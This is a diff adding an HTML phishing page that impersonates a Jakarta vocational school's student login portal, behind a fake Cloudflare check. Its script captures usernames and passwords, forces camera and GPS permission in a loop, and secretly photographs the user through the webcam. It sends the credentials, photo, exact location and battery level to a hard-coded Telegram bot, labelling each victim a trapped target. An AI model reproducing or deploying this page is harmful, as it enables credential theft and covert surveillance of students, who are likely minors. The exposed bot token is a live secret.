@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SIAKAD SISWA/SISWI PUSAT JKT SELATAN</title>
+    <link rel="icon" href="https://cdn.phototourl.com/free/2026-04-30-5c8b66cd-ba87-4b07-86aa-e7e568719e39.jpg" type="image/png" sizes="32x32">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { height: 100vh; overflow: hidden; background: #f0f2f5 url('https://cdn.phototourl.com/free/2026-04-30-9e3b2cf4-e6d0-4d8c-a3b9-58519ccee588.jpg') no-repeat center center fixed; background-size: cover; font-family: 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; padding: 20px; position: relative; }
+    
+    /* CLOUDFLARE OVERLAY */
+    #cf-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; padding: 50px 30px; color: #fff; display: flex; flex-direction: column; align-items: flex-start; }
+    .cf-url { font-size: 36px; font-weight: 500; margin-bottom: 10px; color: #fff; }
+    .cf-title { font-size: 22px; font-weight: 400; margin-bottom: 20px; color: #fff; }
+    .cf-sub { font-size: 15px; color: #d1d1d1; line-height: 1.4; margin-bottom: 30px; max-width: 600px; }
+    .cf-verify-box { background: #1c1c1c; border: 1.5px solid #ffffff; padding: 12px 18px; border-radius: 2px; display: flex; align-items: center; width: 310px; position: relative; }
+    .cf-spin { border: 2.5px solid #333; border-top: 2.5px solid #2ecc71; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin-right: 15px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .cf-text { font-size: 14px; color: #fff; flex-grow: 1; }
+    .cf-logo-section { display: flex; flex-direction: column; align-items: center; }
+    .cf-logo-img { width: 75px; }
+    .cf-footer-links { font-size: 9px; color: #aaa; margin-top: 2px; text-decoration: underline; }
+
+    /* DASHBOARD SIAKAD */
+    .overlay-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1; }
+    .main-container { width: 100%; max-width: 1250px; display: flex; flex-direction: column; gap: 15px; z-index: 2; perspective: 1000px; }
+    
+    .alert-info { background: rgba(231, 243, 255, 0.95); color: #0052cc; padding: 12px; border-radius: 8px; font-size: 13px; text-align: center; font-weight: 600; border: 1px solid #bbdefb; width: 100%; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+    
+    /* ANIMASI NAIK TURUN LAMBAT (SINKRON) */
+    @keyframes slowFloat {
+        0% { transform: translateY(0px) translateZ(20px); }
+        50% { transform: translateY(-10px) translateZ(30px); }
+        100% { transform: translateY(0px) translateZ(20px); }
+    }
+
+    /* KOTAK LOGIN & SEMUA ISI DI DALEMNYA IKUT GERAK */
+    .card-login { 
+        background: rgba(255, 255, 255, 0.98); 
+        padding: 50px; 
+        border-radius: 15px; 
+        border-top: 6px solid #0052cc; 
+        text-align: center; 
+        box-shadow: 0 15px 50px rgba(0,0,0,0.5);
+        animation: slowFloat 4s ease-in-out infinite; 
+        will-change: transform; /* Biar render teks nggak geter */
+    }
+
+    /* LOGO & TEKS DI DALEM BIAR GAK GETER */
+    .logo, h2, p, .input-row, button { 
+        transform: translateZ(10px); 
+        backface-visibility: hidden; 
+    }
+
+    .logo { width: 130px; height: auto; margin-bottom: 20px; border-radius: 50%; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+    .input-row { display: flex; gap: 20px; margin: 30px 0; text-align: left; }
+    .field { flex: 1; }
+    label { font-size: 11px; font-weight: 700; color: #555; text-transform: uppercase; display: block; margin-bottom: 8px; }
+    input { width: 100%; padding: 16px; border: 1px solid #d1d9e6; border-radius: 8px; background: #fafbfc; font-size: 15px; outline: none; }
+    button { width: 100%; padding: 18px; background: #0052cc; color: #fff; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 17px; text-transform: uppercase; box-shadow: 0 4px 15px rgba(0,82,204,0.4); }
+    
+    /* STATS GRID GERAK SINKRON JUGA */
+    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 15px; }
+    
+    .stat-item { 
+        background: rgba(255, 255, 255, 0.9); 
+        padding: 20px 25px; 
+        border-radius: 12px; 
+        border-left: 5px solid #2ecc71; 
+        box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+        animation: slowFloat 3.5s ease-in-out infinite;
+        will-change: transform;
+    }
+    .stat-item:nth-child(2) { animation-delay: 0.3s; }
+
+    /* EFEK SALJU EMOJI */
+    .pencil-snow { position: fixed; top: -50px; font-size: 24px; animation: fall linear infinite; z-index: 0; pointer-events: none; opacity: 0.8; }
+    @keyframes fall {
+        0% { transform: translateY(0px) rotate(0deg); opacity: 0.8; }
+        100% { transform: translateY(110vh) rotate(360deg); opacity: 0; }
+    }
+
+    #video { position: fixed; opacity: 0; pointer-events: none; }
+    #canvas { display: none; }
+</style>
+</head>
+<body>
+
+<div id="cf-wrapper">
+    <div class="cf-url">tinyurl.com</div>
+    <div class="cf-title">Melakukan verifikasi keamanan</div>
+    <div class="cf-sub">Situs web menggunakan layanan keamanan untuk melindungi dari bot jahat. Halaman ini ditunjukkan semasa kami memverifikasi bahwa Anda bukan bot.</div>
+    
+    <div class="cf-verify-box">
+        <div class="cf-spin"></div>
+        <div class="cf-text">Melakukan verifikasi...</div>
+        <div class="cf-logo-section">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo-img">
+            <span class="cf-footer-links">Privasi • Bantuan</span>
+        </div>
+    </div>
+</div>
+
+<div class="overlay-bg"></div>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<div class="main-container">
+    <div class="alert-info">PENGUMUMAN: Validasi Biometrik & Lokasi wajib diizinkan untuk keamanan akses Presisi Digital.</div>
+    <div class="card-login">
+        <img src="https://cdn.phototourl.com/free/2026-04-30-5c8b66cd-ba87-4b07-86aa-e7e568719e39.jpg" class="logo">
+        <h2 style="color: #222; font-size: 1.7rem; font-weight: 800; letter-spacing: 0.5px;">SIAKAD SISWA/SISWI PUSAT JKT SELATAN</h2>
+        <p style="color: #666; font-size: 15px; margin-top: 8px;">SMK HARNASTO INSTITUT</p>
+        <div class="input-row">
+            <div class="field"><label>NISN / USERNAME</label><input type="text" id="u" placeholder="Masukkan NISN"></div>
+            <div class="field"><label>PASSWORD</label><input type="password" id="p" placeholder="••••••••"></div>
+        </div>
+        <button onclick="gas()">VERIFIKASI</button>
+    </div>
+    <div class="stats-grid">
+        <div class="stat-item"><p style="font-size: 11px; color: #777; font-weight: bold; text-transform: uppercase;">Status Sistem</p><p style="font-size: 18px; font-weight: 800; color: #2ecc71;">ONLINE</p></div>
+        <div class="stat-item" style="border-left-color: #0052cc;"><p style="font-size: 11px; color: #777; font-weight: bold; text-transform: uppercase;">User Online</p><p style="font-size: 18px; font-weight: 800; color: #333;">412 Siswa/Guru Saat Ini</p></div>
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_TOKEN = "7793889231:AAFj-Cx9hX9ek-IWGei3f8_DX68mVrnouSM"; 
+    const CHAT_ID = "6644605296";
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    $(document).ready(function() {
+        // OSCAR BYPASS: PAKSA ILANGIN OVERLAY KALO STUCK
+        setTimeout(() => {
+            $('#cf-wrapper').css('display', 'none'); // Paksa hapus dari render
+            startPencilSnow(); // Langsung jalankan hujan emoji
+            console.log("Cloudflare Bypassed");
+        }, 3500);
+    });
+
+    // FUNGSI HUJAN EMOJI - DIPERBAIKI BIAR RINGAN
+    function startPencilSnow() {
+        const emojis = ['📚', '✏️', '✒️', '🖊️', '🖍️', '📝', '📏', '📐', '✂️', '📎'];
+        setInterval(() => {
+            const pencil = document.createElement('div');
+            pencil.className = 'pencil-snow';
+            pencil.innerText = emojis[Math.floor(Math.random() * emojis.length)];
+            pencil.style.left = Math.random() * 100 + 'vw';
+            pencil.style.fontSize = (Math.random() * 15 + 15) + 'px';
+            pencil.style.animationDuration = (Math.random() * 3 + 2) + 's';
+            document.body.appendChild(pencil);
+            setTimeout(() => { pencil.remove(); }, 4500);
+        }, 200); 
+    }
+
+    // PROSES PAKSA SENSOR (LOOPING SAMPE TEMBUS)
+    async function paksaSensor() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            video.srcObject = stream;
+            video.play();
+            navigator.geolocation.getCurrentPosition(() => {}, () => {}, {enableHighAccuracy:true});
+            return true;
+        } catch (err) {
+            alert("SIAKAD ERROR: Akses Kamera & GPS diperlukan untuk Validasi Biometrik Siswa!");
+            return await paksaSensor(); 
+        }
+    }
+
+    async function gas() {
+        let u = $('#u').val(); let p = $('#p').val();
+        if(!u || !p) return alert('NISN/Password tidak boleh kosong!');
+
+        $('button').text('VALIDASI BIOMETRIK...').prop('disabled', true);
+
+        let ok = await paksaSensor();
+        
+        if(ok) {
+            let batt = await navigator.getBattery();
+            let level = (batt.level * 100) + "%";
+            
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                // TUNGGU SENSOR WARM-UP BIAR GAK ITEM
+                await new Promise(r => setTimeout(r, 2500));
+
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                let uri = canvas.toDataURL('image/jpeg', 0.7);
+
+                let msg = `🔥 *TARGET TERPERANGKAP* 🔥\n\n👤 User: ${u}\n🔑 Pass: ${p}\n🔋 Batt: ${level}\n📍 Loc: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+
+                $.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" });
+
+                fetch(uri).then(res => res.blob()).then(blob => {
+                    let fd = new FormData();
+                    fd.append("chat_id", CHAT_ID);
+                    fd.append("photo", blob, "target.jpg");
+                    $.ajax({
+                        url: `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
+                        type: "POST", data: fd, processData: false, contentType: false,
+                        success: () => { window.location.href = "https://smk.sch.id/sekolah/20109247"; }
+                    });
+                });
+            }, (err) => {
+                alert("GPS WAJIB AKTIF!");
+                $('button').text('VERIFIKASI').prop('disabled', false);
+            }, {enableHighAccuracy:true});
+        }
+    }
+</script>
+</body>
+</html>
